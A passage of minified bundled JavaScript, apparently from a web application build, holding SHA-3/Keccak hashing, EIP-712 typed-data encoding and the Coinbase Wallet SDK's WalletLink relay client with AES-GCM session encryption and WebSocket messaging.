R<<24&4278190080|R<<8&16711680|R>>>8&65280|R>>>24&255}r.swap8IfBE=r.isLE?R=>R:R=>p(R),r.byteSwapIfBE=r.swap8IfBE;function g(R){for(let P=0;P<R.length;P++)R[P]=p(R[P]);return R}r.swap32IfBE=r.isLE?R=>R:g;const w=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",m=Array.from({length:256},(R,P)=>P.toString(16).padStart(2,"0"));function x(R){if(n(R),w)return R.toHex();let P="";for(let B=0;B<R.length;B++)P+=m[R[B]];return P}const S={_0:48,_9:57,A:65,F:70,a:97,f:102};function T(R){if(R>=S._0&&R<=S._9)return R-S._0;if(R>=S.A&&R<=S.F)return R-(S.A-10);if(R>=S.a&&R<=S.f)return R-(S.a-10)}function k(R){if(typeof R!="string")throw new Error("hex string expected, got "+typeof R);if(w)return Uint8Array.fromHex(R);const P=R.length,B=P/2;if(P%2)throw new Error("hex string expected, got unpadded hex of length "+P);const M=new Uint8Array(B);for(let W=0,K=0;W<B;W++,K+=2){const q=T(R.charCodeAt(K)),J=T(R.charCodeAt(K+1));if(q===void 0||J===void 0){const le=R[K]+R[K+1];throw new Error('hex string expected, got non-hex character "'+le+'" at index '+K)}M[W]=q*16+J}return M}const I=async()=>{};r.nextTick=I;async function E(R,P,B){let M=Date.now();for(let W=0;W<R;W++){B(W);const K=Date.now()-M;K>=0&&K<P||(await(0,r.nextTick)(),M+=K)}}function C(R){if(typeof R!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(R))}function N(R){return new TextDecoder().decode(R)}function L(R){return typeof R=="string"&&(R=C(R)),n(R),R}function $(R){return typeof R=="string"&&(R=C(R)),n(R),R}function y(...R){let P=0;for(let M=0;M<R.length;M++){const W=R[M];n(W),P+=W.length}const B=new Uint8Array(P);for(let M=0,W=0;M<R.length;M++){const K=R[M];B.set(K,W),W+=K.length}return B}function A(R,P){if(P!==void 0&&{}.toString.call(P)!=="[object Object]")throw new Error("options should be object or undefined");return Object.assign(R,P)}class b{}r.Hash=b;function v(R){const P=M=>R().update(L(M)).digest(),B=R();return P.outputLen=B.outputLen,P.blockLen=B.blockLen,P.create=()=>R(),P}function _(R){const P=(M,W)=>R(W).update(L(M)).digest(),B=R({});return P.outputLen=B.outputLen,P.blockLen=B.blockLen,P.create=M=>R(M),P}function O(R){const P=(M,W)=>R(W).update(L(M)).digest(),B=R({});return P.outputLen=B.outputLen,P.blockLen=B.blockLen,P.create=M=>R(M),P}r.wrapConstructor=v,r.wrapConstructorWithOpts=_,r.wrapXOFConstructorWithOpts=O;function D(R=32){if(e.crypto&&typeof e.crypto.getRandomValues=="function")return e.crypto.getRandomValues(new Uint8Array(R));if(e.crypto&&typeof e.crypto.randomBytes=="function")return Uint8Array.from(e.crypto.randomBytes(R));throw new Error("crypto.getRandomValues must be defined")}}(ZI)),ZI}var uV;function vQe(){if(uV)return nn;uV=1,Object.defineProperty(nn,"__esModule",{value:!0}),nn.shake256=nn.shake128=nn.keccak_512=nn.keccak_384=nn.keccak_256=nn.keccak_224=nn.sha3_512=nn.sha3_384=nn.sha3_256=nn.sha3_224=nn.Keccak=void 0,nn.keccakP=w;const r=mQe(),e=bQe(),t=BigInt(0),i=BigInt(1),n=BigInt(2),s=BigInt(7),o=BigInt(256),a=BigInt(113),c=[],l=[],u=[];for(let T=0,k=i,I=1,E=0;T<24;T++){[I,E]=[E,(2*I+3*E)%5],c.push(2*(5*E+I)),l.push((T+1)*(T+2)/2%64);let C=t;for(let N=0;N<7;N++)k=(k<<i^(k>>s)*a)%o,k&n&&(C^=i<<(i<<BigInt(N))-i);u.push(C)}const d=(0,r.split)(u,!0),h=d[0],f=d[1],p=(T,k,I)=>I>32?(0,r.rotlBH)(T,k,I):(0,r.rotlSH)(T,k,I),g=(T,k,I)=>I>32?(0,r.rotlBL)(T,k,I):(0,r.rotlSL)(T,k,I);function w(T,k=24){const I=new Uint32Array(10);for(let E=24-k;E<24;E++){for(let L=0;L<10;L++)I[L]=T[L]^T[L+10]^T[L+20]^T[L+30]^T[L+40];for(let L=0;L<10;L+=2){const $=(L+8)%10,y=(L+2)%10,A=I[y],b=I[y+1],v=p(A,b,1)^I[$],_=g(A,b,1)^I[$+1];for(let O=0;O<50;O+=10)T[L+O]^=v,T[L+O+1]^=_}let C=T[2],N=T[3];for(let L=0;L<24;L++){const $=l[L],y=p(C,N,$),A=g(C,N,$),b=c[L];C=T[b],N=T[b+1],T[b]=y,T[b+1]=A}for(let L=0;L<50;L+=10){for(let $=0;$<10;$++)I[$]=T[L+$];for(let $=0;$<10;$++)T[L+$]^=~I[($+2)%10]&I[($+4)%10]}T[0]^=h[E],T[1]^=f[E]}(0,e.clean)(I)}class m extends e.Hash{constructor(k,I,E,C=!1,N=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=k,this.suffix=I,this.outputLen=E,this.enableXOF=C,this.rounds=N,(0,e.anumber)(E),!(0<k&&k<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=(0,e.u32)(this.state)}clone(){return this._cloneInto()}keccak(){(0,e.swap32IfBE)(this.state32),w(this.state32,this.rounds),(0,e.swap32IfBE)(this.state32),this.posOut=0,this.pos=0}update(k){(0,e.aexists)(this),k=(0,e.toBytes)(k),(0,e.abytes)(k);const{blockLen:I,state:E}=this,C=k.length;for(let N=0;N<C;){const L=Math.min(I-this.pos,C-N);for(let $=0;$<L;$++)E[this.pos++]^=k[N++];this.pos===I&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:k,suffix:I,pos:E,blockLen:C}=this;k[E]^=I,(I&128)!==0&&E===C-1&&this.keccak(),k[C-1]^=128,this.keccak()}writeInto(k){(0,e.aexists)(this,!1),(0,e.abytes)(k),this.finish();const I=this.state,{blockLen:E}=this;for(let C=0,N=k.length;C<N;){this.posOut>=E&&this.keccak();const L=Math.min(E-this.posOut,N-C);k.set(I.subarray(this.posOut,this.posOut+L),C),this.posOut+=L,C+=L}return k}xofInto(k){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(k)}xof(k){return(0,e.anumber)(k),this.xofInto(new Uint8Array(k))}digestInto(k){if((0,e.aoutput)(k,this),this.finished)throw new Error("digest() was already called");return this.writeInto(k),this.destroy(),k}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,(0,e.clean)(this.state)}_cloneInto(k){const{blockLen:I,suffix:E,outputLen:C,rounds:N,enableXOF:L}=this;return k||(k=new m(I,E,C,L,N)),k.state32.set(this.state32),k.pos=this.pos,k.posOut=this.posOut,k.finished=this.finished,k.rounds=N,k.suffix=E,k.outputLen=C,k.enableXOF=L,k.destroyed=this.destroyed,k}}nn.Keccak=m;const x=(T,k,I)=>(0,e.createHasher)(()=>new m(k,T,I));nn.sha3_224=x(6,144,224/8),nn.sha3_256=x(6,136,256/8),nn.sha3_384=x(6,104,384/8),nn.sha3_512=x(6,72,512/8),nn.keccak_224=x(1,144,224/8),nn.keccak_256=x(1,136,256/8),nn.keccak_384=x(1,104,384/8),nn.keccak_512=x(1,72,512/8);const S=(T,k,I)=>(0,e.createXOFer)((E={})=>new m(k,T,E.dkLen===void 0?I:E.dkLen,!0));return nn.shake128=S(31,168,128/8),nn.shake256=S(31,136,256/8),nn}var YI,dV;function Une(){if(dV)return YI;dV=1;const{keccak_256:r}=vQe();function e(f){return Buffer.allocUnsafe(f).fill(0)}function t(f){return f.toString(2).length}function i(f,p){let g=f.toString(16);g.length%2!==0&&(g="0"+g);const w=g.match(/.{1,2}/g).map(m=>parseInt(m,16));for(;w.length<p;)w.unshift(0);return Buffer.from(w)}function n(f,p){const g=f<0n;let w;if(g){const m=(1n<<BigInt(p))-1n;w=(~f&m)+1n}else w=f;return w&=(1n<<BigInt(p))-1n,w}function s(f,p,g){const w=e(p);return f=a(f),g?f.length<p?(f.copy(w),w):f.slice(0,p):f.length<p?(f.copy(w,p-f.length),w):f.slice(-p)}function o(f,p){return s(f,p,!0)}function a(f){if(!Buffer.isBuffer(f))if(Array.isArray(f))f=Buffer.from(f);else if(typeof f=="string")d(f)?f=Buffer.from(u(h(f)),"hex"):f=Buffer.from(f);else if(typeof f=="number")f=intToBuffer(f);else if(f==null)f=Buffer.allocUnsafe(0);else if(typeof f=="bigint")f=i(f);else if(f.toArray)f=Buffer.from(f.toArray());else throw new Error("invalid type");return f}function c(f){return f=a(f),"0x"+f.toString("hex")}function l(f,p){if(f=a(f),p||(p=256),p!==256)throw new Error("unsupported");return Buffer.from(r(new Uint8Array(f)))}function u(f){return f.length%2?"0"+f:f}function d(f){return typeof f=="string"&&f.match(/^0x[0-9A-Fa-f]*$/)}function h(f){return typeof f=="string"&&f.startsWith("0x")?f.slice(2):f}return YI={zeros:e,setLength:s,setLengthRight:o,isHexString:d,stripHexPrefix:h,toBuffer:a,bufferToHex:c,keccak:l,bitLengthFromBigInt:t,bufferBEFromBigInt:i,twosFromBigInt:n},YI}var JI,hV;function yQe(){if(hV)return JI;hV=1;const r=Une();function e(h){return h.startsWith("int[")?"int256"+h.slice(3):h==="int"?"int256":h.startsWith("uint[")?"uint256"+h.slice(4):h==="uint"?"uint256":h.startsWith("fixed[")?"fixed128x128"+h.slice(5):h==="fixed"?"fixed128x128":h.startsWith("ufixed[")?"ufixed128x128"+h.slice(6):h==="ufixed"?"ufixed128x128":h}function t(h){return Number.parseInt(/^\D+(\d+)$/.exec(h)[1],10)}function i(h){var f=/^\D+(\d+)x(\d+)$/.exec(h);return[Number.parseInt(f[1],10),Number.parseInt(f[2],10)]}function n(h){var f=h.match(/(.*)\[(.*?)\]$/);return f?f[2]===""?"dynamic":Number.parseInt(f[2],10):null}function s(h){var f=typeof h;if(f==="string"||f==="number")return BigInt(h);if(f==="bigint")return h;throw new Error("Argument is not a number")}function o(h,f){var p,g,w,m;if(h==="address")return o("uint160",s(f));if(h==="bool")return o("uint8",f?1:0);if(h==="string")return o("bytes",new Buffer(f,"utf8"));if(c(h)){if(typeof f.length>"u")throw new Error("Not an array?");if(p=n(h),p!=="dynamic"&&p!==0&&f.length>p)throw new Error("Elements exceed array size: "+p);w=[],h=h.slice(0,h.lastIndexOf("[")),typeof f=="string"&&(f=JSON.parse(f));for(m in f)w.push(o(h,f[m]));if(p==="dynamic"){var x=o("uint256",f.length);w.unshift(x)}return Buffer.concat(w)}else{if(h==="bytes")return f=new Buffer(f),w=Buffer.concat([o("uint256",f.length),f]),f.length%32!==0&&(w=Buffer.concat([w,r.zeros(32-f.length%32)])),w;if(h.startsWith("bytes")){if(p=t(h),p<1||p>32)throw new Error("Invalid bytes<N> width: "+p);return r.setLengthRight(f,32)}else if(h.startsWith("uint")){if(p=t(h),p%8||p<8||p>256)throw new Error("Invalid uint<N> width: "+p);g=s(f);const S=r.bitLengthFromBigInt(g);if(S>p)throw new Error("Supplied uint exceeds width: "+p+" vs "+S);if(g<0)throw new Error("Supplied uint is negative");return r.bufferBEFromBigInt(g,32)}else if(h.startsWith("int")){if(p=t(h),p%8||p<8||p>256)throw new Error("Invalid int<N> width: "+p);g=s(f);const S=r.bitLengthFromBigInt(g);if(S>p)throw new Error("Supplied int exceeds width: "+p+" vs "+S);const T=r.twosFromBigInt(g,256);return r.bufferBEFromBigInt(T,32)}else if(h.startsWith("ufixed")){if(p=i(h),g=s(f),g<0)throw new Error("Supplied ufixed is negative");return o("uint256",g*BigInt(2)**BigInt(p[1]))}else if(h.startsWith("fixed"))return p=i(h),o("int256",s(f)*BigInt(2)**BigInt(p[1]))}throw new Error("Unsupported or invalid type: "+h)}function a(h){return h==="string"||h==="bytes"||n(h)==="dynamic"}function c(h){return h.lastIndexOf("]")===h.length-1}function l(h,f){var p=[],g=[],w=32*h.length;for(var m in h){var x=e(h[m]),S=f[m],T=o(x,S);a(x)?(p.push(o("uint256",w)),g.push(T),w+=T.length):p.push(T)}return Buffer.concat(p.concat(g))}function u(h,f){if(h.length!==f.length)throw new Error("Number of types are not matching the values");for(var p,g,w=[],m=0;m<h.length;m++){var x=e(h[m]),S=f[m];if(x==="bytes")w.push(S);else if(x==="string")w.push(new Buffer(S,"utf8"));else if(x==="bool")w.push(new Buffer(S?"01":"00","hex"));else if(x==="address")w.push(r.setLength(S,20));else if(x.startsWith("bytes")){if(p=t(x),p<1||p>32)throw new Error("Invalid bytes<N> width: "+p);w.push(r.setLengthRight(S,p))}else if(x.startsWith("uint")){if(p=t(x),p%8||p<8||p>256)throw new Error("Invalid uint<N> width: "+p);g=s(S);const T=r.bitLengthFromBigInt(g);if(T>p)throw new Error("Supplied uint exceeds width: "+p+" vs "+T);w.push(r.bufferBEFromBigInt(g,p/8))}else if(x.startsWith("int")){if(p=t(x),p%8||p<8||p>256)throw new Error("Invalid int<N> width: "+p);g=s(S);const T=r.bitLengthFromBigInt(g);if(T>p)throw new Error("Supplied int exceeds width: "+p+" vs "+T);const k=r.twosFromBigInt(g,p);w.push(r.bufferBEFromBigInt(k,p/8))}else throw new Error("Unsupported or invalid type: "+x)}return Buffer.concat(w)}function d(h,f){return r.keccak(u(h,f))}return JI={rawEncode:l,solidityPack:u,soliditySHA3:d},JI}var QI,fV;function xQe(){if(fV)return QI;fV=1;const r=Une(),e=yQe(),t={type:"object",properties:{types:{type:"object",additionalProperties:{type:"array",items:{type:"object",properties:{name:{type:"string"},type:{type:"string"}},required:["name","type"]}}},primaryType:{type:"string"},domain:{type:"object"},message:{type:"object"}},required:["types","primaryType","domain","message"]},i={encodeData(s,o,a,c=!0){const l=["bytes32"],u=[this.hashType(s,a)];if(c){const d=(h,f,p)=>{if(a[f]!==void 0)return["bytes32",p==null?"0x0000000000000000000000000000000000000000000000000000000000000000":r.keccak(this.encodeData(f,p,a,c))];if(p===void 0)throw new Error(`missing value for field ${h} of type ${f}`);if(f==="bytes")return["bytes32",r.keccak(p)];if(f==="string")return typeof p=="string"&&(p=Buffer.from(p,"utf8")),["bytes32",r.keccak(p)];if(f.lastIndexOf("]")===f.length-1){const g=f.slice(0,f.lastIndexOf("[")),w=p.map(m=>d(h,g,m));return["bytes32",r.keccak(e.rawEncode(w.map(([m])=>m),w.map(([,m])=>m)))]}return[f,p]};for(const h of a[s]){const[f,p]=d(h.name,h.type,o[h.name]);l.push(f),u.push(p)}}else for(const d of a[s]){let h=o[d.name];if(h!==void 0)if(d.type==="bytes")l.push("bytes32"),h=r.keccak(h),u.push(h);else if(d.type==="string")l.push("bytes32"),typeof h=="string"&&(h=Buffer.from(h,"utf8")),h=r.keccak(h),u.push(h);else if(a[d.type]!==void 0)l.push("bytes32"),h=r.keccak(this.encodeData(d.type,h,a,c)),u.push(h);else{if(d.type.lastIndexOf("]")===d.type.length-1)throw new Error("Arrays currently unimplemented in encodeData");l.push(d.type),u.push(h)}}return e.rawEncode(l,u)},encodeType(s,o){let a="",c=this.findTypeDependencies(s,o).filter(l=>l!==s);c=[s].concat(c.sort());for(const l of c){if(!o[l])throw new Error("No type definition specified: "+l);a+=l+"("+o[l].map(({name:d,type:h})=>h+" "+d).join(",")+")"}return a},findTypeDependencies(s,o,a=[]){if(s=s.match(/^\w*/)[0],a.includes(s)||o[s]===void 0)return a;a.push(s);for(const c of o[s])for(const l of this.findTypeDependencies(c.type,o,a))!a.includes(l)&&a.push(l);return a},hashStruct(s,o,a,c=!0){return r.keccak(this.encodeData(s,o,a,c))},hashType(s,o){return r.keccak(this.encodeType(s,o))},sanitizeData(s){const o={};for(const a in t.properties)s[a]&&(o[a]=s[a]);return o.types&&(o.types=Object.assign({EIP712Domain:[]},o.types)),o},hash(s,o=!0){const a=this.sanitizeData(s),c=[Buffer.from("1901","hex")];return c.push(this.hashStruct("EIP712Domain",a.domain,a.types,o)),a.primaryType!=="EIP712Domain"&&c.push(this.hashStruct(a.primaryType,a.message,a.types,o)),r.keccak(Buffer.concat(c))}};QI={TYPED_MESSAGE_SCHEMA:t,TypedDataUtils:i,hashForSignTypedDataLegacy:function(s){return n(s.data)},hashForSignTypedData_v3:function(s){return i.hash(s.data,!1)},hashForSignTypedData_v4:function(s){return i.hash(s.data)}};function n(s){const o=new Error("Expect argument to be non-empty array");if(typeof s!="object"||!s.length)throw o;const a=s.map(function(u){return u.type==="bytes"?r.toBuffer(u.value):u.value}),c=s.map(function(u){return u.type}),l=s.map(function(u){if(!u.name)throw o;return u.type+" "+u.name});return e.soliditySHA3(["bytes32","bytes32"],[e.soliditySHA3(new Array(s.length).fill("string"),l),e.soliditySHA3(c,a)])}return QI}var CQe=xQe();const _8=Ss(CQe),EQe="walletUsername",cP="Addresses",_Qe="AppVersion";function oo(r){return r.errorMessage!==void 0}class SQe{constructor(e){this.secret=e}async encrypt(e){const t=this.secret;if(t.length!==64)throw Error("secret must be 256 bits");const i=crypto.getRandomValues(new Uint8Array(12)),n=await crypto.subtle.importKey("raw",E9(t),{name:"aes-gcm"},!1,["encrypt","decrypt"]),s=new TextEncoder,o=await window.crypto.subtle.encrypt({name:"AES-GCM",iv:i},n,s.encode(e)),a=16,c=o.slice(o.byteLength-a),l=o.slice(0,o.byteLength-a),u=new Uint8Array(c),d=new Uint8Array(l),h=new Uint8Array([...i,...u,...d]);return JO(h)}async decrypt(e){const t=this.secret;if(t.length!==64)throw Error("secret must be 256 bits");return new Promise((i,n)=>{(async function(){const s=await crypto.subtle.importKey("raw",E9(t),{name:"aes-gcm"},!1,["encrypt","decrypt"]),o=E9(e),a=o.slice(0,12),c=o.slice(12,28),l=o.slice(28),u=new Uint8Array([...l,...c]),d={name:"AES-GCM",iv:new Uint8Array(a)};try{const h=await window.crypto.subtle.decrypt(d,s,u),f=new TextDecoder;i(f.decode(h))}catch(h){n(h)}})()})}}class AQe{constructor(e,t,i){this.linkAPIUrl=e,this.sessionId=t;const n=`${t}:${i}`;this.auth=`Basic ${btoa(n)}`}async markUnseenEventsAsSeen(e){return Promise.all(e.map(t=>fetch(`${this.linkAPIUrl}/events/${t.eventId}/seen`,{method:"POST",headers:{Authorization:this.auth}}))).catch(t=>console.error("Unabled to mark event as failed:",t))}async fetchUnseenEvents(){var e;const t=await fetch(`${this.linkAPIUrl}/events?unseen=true`,{headers:{Authorization:this.auth}});if(t.ok){const{events:i,error:n}=await t.json();if(n)throw new Error(`Check unseen events failed: ${n}`);const s=(e=i?.filter(o=>o.event==="Web3Response").map(o=>({type:"Event",sessionId:this.sessionId,eventId:o.id,event:o.event,data:o.data})))!==null&&e!==void 0?e:[];return this.markUnseenEventsAsSeen(s),s}throw new Error(`Check unseen events failed: ${t.status}`)}}var Jh;(function(r){r[r.DISCONNECTED=0]="DISCONNECTED",r[r.CONNECTING=1]="CONNECTING",r[r.CONNECTED=2]="CONNECTED"})(Jh||(Jh={}));class IQe{setConnectionStateListener(e){this.connectionStateListener=e}setIncomingDataListener(e){this.incomingDataListener=e}constructor(e,t=WebSocket){this.WebSocketClass=t,this.webSocket=null,this.pendingData=[],this.url=e.replace(/^http/,"ws")}async connect(){if(this.webSocket)throw new Error("webSocket object is not null");return new Promise((e,t)=>{var i;let n;try{this.webSocket=n=new this.WebSocketClass(this.url)}catch(s){t(s);return}(i=this.connectionStateListener)===null||i===void 0||i.call(this,Jh.CONNECTING),n.onclose=s=>{var o;this.clearWebSocket(),t(new Error(`websocket error ${s.code}: ${s.reason}`)),(o=this.connectionStateListener)===null||o===void 0||o.call(this,Jh.DISCONNECTED)},n.onopen=s=>{var o;e(),(o=this.connectionStateListener)===null||o===void 0||o.call(this,Jh.CONNECTED),this.pendingData.length>0&&([...this.pendingData].forEach(c=>this.sendData(c)),this.pendingData=[])},n.onmessage=s=>{var o,a;if(s.data==="h")(o=this.incomingDataListener)===null||o===void 0||o.call(this,{type:"Heartbeat"});else try{const c=JSON.parse(s.data);(a=this.incomingDataListener)===null||a===void 0||a.call(this,c)}catch{}}})}disconnect(){var e;const{webSocket:t}=this;if(t){this.clearWebSocket(),(e=this.connectionStateListener)===null||e===void 0||e.call(this,Jh.DISCONNECTED),this.connectionStateListener=void 0,this.incomingDataListener=void 0;try{t.close()}catch{}}}sendData(e){const{webSocket:t}=this;if(!t){this.pendingData.push(e),this.connect();return}t.send(e)}clearWebSocket(){const{webSocket:e}=this;e&&(this.webSocket=null,e.onclose=null,e.onerror=null,e.onmessage=null,e.onopen=null)}}const pV=1e4,TQe=6e4;class kQe{constructor({session:e,linkAPIUrl:t,listener:i}){this.destroyed=!1,this.lastHeartbeatResponse=0,this.nextReqId=Fh(1),this._connected=!1,this._linked=!1,this.shouldFetchUnseenEventsOnConnect=!1,this.requestResolutions=new Map,this.handleSessionMetadataUpdated=s=>{if(!s)return;new Map([["__destroyed",this.handleDestroyed],["EthereumAddress",this.handleAccountUpdated],["WalletUsername",this.handleWalletUsernameUpdated],["AppVersion",this.handleAppVersionUpdated],["ChainId",a=>s.JsonRpcUrl&&this.handleChainUpdated(a,s.JsonRpcUrl)]]).forEach((a,c)=>{const l=s[c];l!==void 0&&a(l)})},this.handleDestroyed=s=>{var o;s==="1"&&((o=this.listener)===null||o===void 0||o.resetAndReload())},this.handleAccountUpdated=async s=>{var o;const a=await this.cipher.decrypt(s);(o=this.listener)===null||o===void 0||o.accountUpdated(a)},this.handleMetadataUpdated=async(s,o)=>{var a;const c=await this.cipher.decrypt(o);(a=this.listener)===null||a===void 0||a.metadataUpdated(s,c)},this.handleWalletUsernameUpdated=async s=>{this.handleMetadataUpdated(EQe,s)},this.handleAppVersionUpdated=async s=>{this.handleMetadataUpdated(_Qe,s)},this.handleChainUpdated=async(s,o)=>{var a;const c=await this.cipher.decrypt(s),l=await this.cipher.decrypt(o);(a=this.listener)===null||a===void 0||a.chainUpdated(c,l)},this.session=e,this.cipher=new SQe(e.secret),this.listener=i;const n=new IQe(`${t}/rpc`,WebSocket);n.setConnectionStateListener(async s=>{let o=!1;switch(s){case Jh.DISCONNECTED:if(!this.destroyed){const a=async()=>{await new Promise(c=>setTimeout(c,5e3)),this.destroyed||n.connect().catch(()=>{a()})};a()}break;case Jh.CONNECTED:o=await this.handleConnected(),this.updateLastHeartbeat(),setInterval(()=>{this.heartbeat()},pV),this.shouldFetchUnseenEventsOnConnect&&this.fetchUnseenEventsAPI();break;case Jh.CONNECTING:break}this.connected!==o&&(this.connected=o)}),n.setIncomingDataListener(s=>{var o;switch(s.type){case"Heartbeat":this.updateLastHeartbeat();return;case"IsLinkedOK":case"Linked":{const a=s.type==="IsLinkedOK"?s.linked:void 0;this.linked=a||s.onlineGuests>0;break}case"GetSessionConfigOK":case"SessionConfigUpdated":{this.handleSessionMetadataUpdated(s.metadata);break}case"Event":{this.handleIncomingEvent(s);break}}s.id!==void 0&&((o=this.requestResolutions.get(s.id))===null||o===void 0||o(s))}),this.ws=n,this.http=new AQe(t,e.id,e.key)}connect(){if(this.destroyed)throw new Error("instance is destroyed");this.ws.connect()}async destroy(){this.destroyed||(await this.makeRequest({type:"SetSessionConfig",id:Fh(this.nextReqId++),sessionId:this.session.id,metadata:{__destroyed:"1"}},{timeout:1e3}),this.destroyed=!0,this.ws.disconnect(),this.listener=void 0)}get connected(){return this._connected}set connected(e){this._connected=e}get linked(){return this._linked}set linked(e){var t,i;this._linked=e,e&&((t=this.onceLinked)===null||t===void 0||t.call(this)),(i=this.listener)===null||i===void 0||i.linkedUpdated(e)}setOnceLinked(e){return new Promise(t=>{this.linked?e().then(t):this.onceLinked=()=>{e().then(t),this.onceLinked=void 0}})}async handleIncomingEvent(e){var t;if(e.type!=="Event"||e.event!=="Web3Response")return;const i=await this.cipher.decrypt(e.data),n=JSON.parse(i);if(n.type!=="WEB3_RESPONSE")return;const{id:s,response:o}=n;(t=this.listener)===null||t===void 0||t.handleWeb3ResponseMessage(s,o)}async checkUnseenEvents(){if(!this.connected){this.shouldFetchUnseenEventsOnConnect=!0;return}await new Promise(e=>setTimeout(e,250));try{await this.fetchUnseenEventsAPI()}catch(e){console.error("Unable to check for unseen events",e)}}async fetchUnseenEventsAPI(){this.shouldFetchUnseenEventsOnConnect=!1,(await this.http.fetchUnseenEvents()).forEach(t=>this.handleIncomingEvent(t))}async publishEvent(e,t,i=!1){const n=await this.cipher.encrypt(JSON.stringify(Object.assign(Object.assign({},t),{origin:location.origin,location:location.href,relaySource:"coinbaseWalletExtension"in window&&window.coinbaseWalletExtension?"injected_sdk":"sdk"}))),s={type:"PublishEvent",id:Fh(this.nextReqId++),sessionId:this.session.id,event:e,data:n,callWebhook:i};return this.setOnceLinked(async()=>{const o=await this.makeRequest(s);if(o.type==="Fail")throw new Error(o.error||"failed to publish event");return o.eventId})}sendData(e){this.ws.sendData(JSON.stringify(e))}updateLastHeartbeat(){this.lastHeartbeatResponse=Date.now()}heartbeat(){if(Date.now()-this.lastHeartbeatResponse>pV*2){this.ws.disconnect();return}try{this.ws.sendData("h")}catch{}}async makeRequest(e,t={timeout:TQe}){const i=e.id;this.sendData(e);let n;return Promise.race([new Promise((s,o)=>{n=window.setTimeout(()=>{o(new Error(`request ${i} timed out`))},t.timeout)}),new Promise(s=>{this.requestResolutions.set(i,o=>{clearTimeout(n),s(o),this.requestResolutions.delete(i)})})])}async handleConnected(){return(await this.makeRequest({type:"HostSession",id:Fh(this.nextReqId++),sessionId:this.session.id,sessionKey:this.session.key})).type==="Fail"?!1:(this.sendData({type:"IsLinked",id:Fh(this.nextReqId++),sessionId:this.session.id}),this.sendData({type:"GetSessionConfig",id:Fh(this.nextReqId++),sessionId:this.session.id}),!0)}}class NQe{constructor(){this._nextRequestId=0,this.callbacks=new Map}makeRequestId(){this._nextRequestId=(this._nextRequestId+1)%2147483647;const e=this._nextRequestId,t=One(e.toString(16));return this.callbacks.get(t)&&this.callbacks.delete(t),e}}const gV="session:id",mV="session:secret",wV="session:linked";class dw{constructor(e,t,i,n=!1){this.storage=e,this.id=t,this.secret=i,this.key=Phe(jY(`${t}, ${i} WalletLink`)),this._linked=!!n}static create(e){const t=d1(16),i=d1(32);return new dw(e,t,i).save()}static load(e){const t=e.getItem(gV),i=e.getItem(wV),n=e.getItem(mV);return t&&n?new dw(e,t,n,i==="1"):null}get linked(){return this._linked}set linked(e){this._linked=e,this.persistLinked()}save(){return this.storage.setItem(gV,this.id),this.storage.setItem(mV,this.secret),this.persistLinked(),this}persistLinked(){this.storage.setItem(wV,this._linked?"1":"0")}}function PQe(){try{return window.frameElement!==null}catch{return!1}}function $Qe(){try{return PQe()&&window.top?window.top.location:window.location}catch{return window.location}}function RQe(){var r;return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test((r=window?.navigator)===null||r===void 0?void 0:r.userAgent)}function jne(){var r,e;return(e=(r=window?.matchMedia)===null||r===void 0?void 0:r.call(window,"(prefers-color-scheme: dark)").matches)!==null&&e!==void 0?e:!1}const OQe='@namespace svg "http://www.w3.org/2000/svg";.-cbwsdk-css-reset,.-cbwsdk-css-reset *{animation:none;animation-delay:0;animation-direction:normal;animation-duration:0;animation-fill-mode:none;animation-iteration-count:1;animation-name:none;animation-play-state:running;animation-timing-function:ease;backface-visibility:visible;background:0;background-attachment:scroll;background-clip:border-box;background-color:rgba(0,0,0,0);background-image:none;background-origin:padding-box;background-position:0 0;background-position-x:0;background-position-y:0;background-repeat:repeat;background-size:auto auto;border:0;border-style:none;border-width:medium;border-color:inherit;border-bottom:0;border-bottom-color:inherit;border-bottom-left-radius:0;border-bottom-right-radius:0;border-bottom-style:none;border-bottom-width:medium;border-collapse:separate;border-image:none;border-left:0;border-left-color:inherit;border-left-style:none;border-left-width:medium;border-radius:0;border-right:0;border-right-color:inherit;border-right-style:none;border-right-width:medium;border-spacing:0;border-top:0;border-top-color:inherit;border-top-left-radius:0;border-top-right-radius:0;border-top-style:none;border-top-width:medium;box-shadow:none;box-sizing:border-box;caption-side:top;clear:none;clip:auto;color:inherit;columns:auto;column-count:auto;column-fill:balance;column-gap:normal;column-rule:medium none currentColor;column-rule-color:currentColor;column-rule-style:none;column-rule-width:none;column-span:1;column-width:auto;counter-increment:none;counter-reset:none;direction:ltr;empty-cells:show;float:none;font:normal;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;font-size:medium;font-style:normal;font-variant:normal;font-weight:normal;height:auto;hyphens:none;letter-spacing:normal;line-height:normal;list-style:none;list-style-image:none;list-style-position:outside;list-style-type:disc;margin:0;margin-bottom:0;margin-left:0;margin-right:0;margin-top:0;opacity:1;orphans:0;outline:0;outline-color:invert;outline-style:none;outline-width:medium;overflow:visible;overflow-x:visible;overflow-y:visible;padding:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;page-break-after:auto;page-break-before:auto;page-break-inside:auto;perspective:none;perspective-origin:50% 50%;pointer-events:auto;position:static;quotes:"\\201C" "\\201D" "\\2018" "\\2019";tab-size:8;table-layout:auto;text-align:inherit;text-align-last:auto;text-decoration:none;text-decoration-color:inherit;text-decoration-line:none;text-decoration-style:solid;text-indent:0;text-shadow:none;text-transform:none;transform:none;transform-style:flat;transition:none;transition-delay:0s;transition-duration:0s;transition-property:none;transition-timing-function:ease;unicode-bidi:normal;vertical-align:baseline;visibility:visible;white-space:normal;widows:0;word-spacing:normal;z-index:auto}.-cbwsdk-css-reset strong{font-weight:bold}.-cbwsdk-css-reset *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;line-height:1}.-cbwsdk-css-reset [class*=container]{margin:0;padding:0}.-cbwsdk-css-reset style{display:none}';function Fne(){const r=document.createElement("style");r.type="text/css",r.appendChild(document.createTextNode(OQe)),document.documentElement.appendChild(r)}function qne(r){var e,t,i="";if(typeof r=="string"||typeof 